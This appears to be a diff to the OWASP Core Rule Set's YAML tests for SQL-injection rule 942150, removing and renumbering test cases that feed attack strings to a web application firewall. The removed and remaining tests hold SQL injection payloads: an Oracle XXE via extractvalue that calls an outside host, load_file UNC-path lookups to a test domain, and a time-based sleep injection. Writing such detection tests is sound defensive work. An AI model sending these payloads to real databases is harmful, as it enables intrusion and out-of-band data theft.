@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Christian Folini"
+  author: "Christian Folini,azurit"
   description: Various SQL injection tests
   enabled: true
   name: 942150.yaml
@@ -90,23 +90,6 @@ tests:
           output:
             log_contains: id "942150"
   - test_title: 942150-6
-    desc: "Advanced SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: OWASP ModSecurity Core Rule Set
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=foo'||(select extractvalue(xmltype('<?xml version=\"1.1\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \"https://unit'||'tests.coreruleset.org/\">%tocob;"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-7
     desc: "Simple SQL injection"
     stages:
       - stage:
@@ -123,24 +106,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-8
-    desc: "Simple SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: OWASP ModSecurity Core Rule Set
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=/config.txt' (select load_file('\\\\\\\\unittests.coreruleset.org\\\\zow')) '"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-9
+  - test_title: 942150-7
     desc: "Simple SQL injection"
     stages:
       - stage:
@@ -157,7 +123,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-10
+  - test_title: 942150-8
     desc: "Advanced SQL injection"
     stages:
       - stage:
@@ -174,7 +140,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-11
+  - test_title: 942150-9
     desc: "Simple injection"
     stages:
       - stage:
@@ -191,7 +157,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-12
+  - test_title: 942150-10
     desc: "Advanced SQL injection"
     stages:
       - stage:
@@ -208,24 +174,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-13
-    desc: "Advanced SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: OWASP ModSecurity Core Rule Set
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=(select load_file('\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\\\\\\\\\hvs'))"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-14
+  - test_title: 942150-11
     desc: "Advanced SQL injection"
     stages:
       - stage:
@@ -242,7 +191,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-15
+  - test_title: 942150-12
     desc: "Simple injection"
     stages:
       - stage:
@@ -259,7 +208,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-16
+  - test_title: 942150-13
     desc: "Simple injection"
     stages:
       - stage:
@@ -276,7 +225,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-17
+  - test_title: 942150-14
     desc: "Advanced injection"
     stages:
       - stage:
@@ -293,7 +242,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-18
+  - test_title: 942150-15
     desc: "Advanced injection"
     stages:
       - stage:
@@ -310,7 +259,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-19
+  - test_title: 942150-16
     desc: "Simple injection"
     stages:
       - stage:
@@ -324,23 +273,6 @@ tests:
             port: 80
             uri: "/"
             data: "var=\\foobar.txt\" or sleep(4) #"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-20
-    desc: "Simple injection using 'fetch_in_set'"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: OWASP ModSecurity Core Rule Set
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=, FIND_IN_SET('22', Category )"
             version: HTTP/1.0
           output:
             log_contains: id "942150"
